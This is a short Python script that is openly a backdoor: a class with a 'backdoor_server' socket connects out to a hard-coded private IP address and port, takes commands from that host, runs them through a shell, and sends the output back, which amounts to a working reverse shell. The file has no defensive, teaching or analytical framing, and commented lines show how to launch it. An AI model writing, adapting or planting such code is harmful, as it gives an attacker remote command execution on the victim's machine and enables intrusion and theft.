import socket
import subprocess

class SocketServer:
    def __init__(self,ip,port):
        self.backdoor_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.backdoor_server.connect(("192.168.8.111", 8080))
    def command_send(self,command):
        self.backdoor_server.send((command).encode())

    def command_execution(self,command):
        return subprocess.check_output(command, shell=True)

    def exec(self):
        while True:
            command = self.backdoor_server.recv(1024)  # byte
            cmd = self.command_execution(command)
            self.backdoor_server.send(cmd)
        self.backdoor_server.close()

#my_socket_object = SocketServer("10.0.3.4",7707)
#my_socket_object.command_send()
#my_socket_object.exec()